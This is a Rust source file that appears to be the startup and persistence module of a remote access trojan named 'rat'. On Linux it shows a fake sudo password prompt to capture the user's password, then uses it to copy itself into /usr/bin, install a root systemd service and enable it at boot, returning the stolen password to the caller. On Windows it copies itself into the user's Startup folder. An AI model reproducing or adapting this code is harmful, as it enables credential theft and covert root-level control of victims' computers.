use crate::extensions::Password;
use std::{fs::File, io::Write, path::PathBuf, process::Stdio};

pub fn startup() -> Password {
    if cfg!(target_os = "linux") {
        // grabbing the path of the current running executable
        let current_exe_path = std::env::current_exe().unwrap();

        // creating a buffered writer for stdout
        let mut out = std::io::BufWriter::new(std::io::stdout().lock());

        // copying the executable to the /usr/bin directory
        let pass = loop {
            write!(
                out,
                "[sudo] enter password for {}: ",
                std::env::var("USER").unwrap()
            )
            .unwrap();
            let _ = out.flush();

            let mut pass = String::new();
            std::io::stdin().read_line(&mut pass).unwrap();
            pass.pop();

            let mut child = std::process::Command::new("sudo")
                .arg("-kS")
                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
                .stdin(Stdio::piped())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()
                .unwrap();

            let _ = child.stdin.as_mut().unwrap().write_all(&pass.as_bytes());

            if let Ok(op) = child.wait_with_output() {
                if let Some(0) = op.status.code() {
                    break pass;
                } else if let Some(1) = op.status.code() {
                    writeln!(out, "Sorry, try again.").unwrap();
                    continue;
                }
            }
        };

        let service = "[Unit]
Description=A lightweight daemon
After=network.target

[Service]
User=root
Group=root
ExecStart=/usr/bin/rat
WorkingDirectory=/var/rat/

[Install]
WantedBy=multi-user.target\n";

        // creating service file
        let mut f = File::create("/tmp/ratd").unwrap();
        let _ = f.write_all(&service.as_bytes());

        // moving service file
        let mut child1 = std::process::Command::new("sudo")
            .args(["-kS", "mv", "/tmp/ratd", "/etc/systemd/system/ratd.service"])
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();

        let _ = child1.stdin.as_mut().unwrap().write_all(&pass.as_bytes());
        let _ = child1.wait_with_output();

        // enabling service file on startup
        let mut child2 = std::process::Command::new("sudo")
            .args(["-kS", "systemctl", "enable", "ratd.service"])
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();

        let _ = child2.stdin.as_mut().unwrap().write_all(&pass.as_bytes());
        let _ = child2.wait_with_output();

        return Password::new(pass);
    } else if cfg!(target_os = "windows") {
        let mut user_startup_dir = PathBuf::with_capacity(96);
        user_startup_dir.push(std::env::var("USERPROFILE").unwrap());
        user_startup_dir.push("/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
        let current_exe_path = std::env::current_exe().unwrap();
        user_startup_dir.push("rat.exe");
        let _ = std::fs::copy(current_exe_path, user_startup_dir);
    } else if cfg!(target_os = "macos") {
    } else if cfg!(target_os = "android") {
    } else if cfg!(target_os = "ios") {
    }
    Password::new(format!(""))
}

// unsupported systems
// ["aix", "cuda", "dragonfly", "emscripten", "espidf",
// "freebsd", "fuchsia", "haiku", "hermit", "horizon", "hurd",
// "illumos", "l4re", "netbsd", "nto", "openbsd", "psp",
// "redox", "solaris", "solid_asp3", "teeos", "tvos", "uefi",
// "visionos", "vita", "vxworks", "wasi", "watchos"]
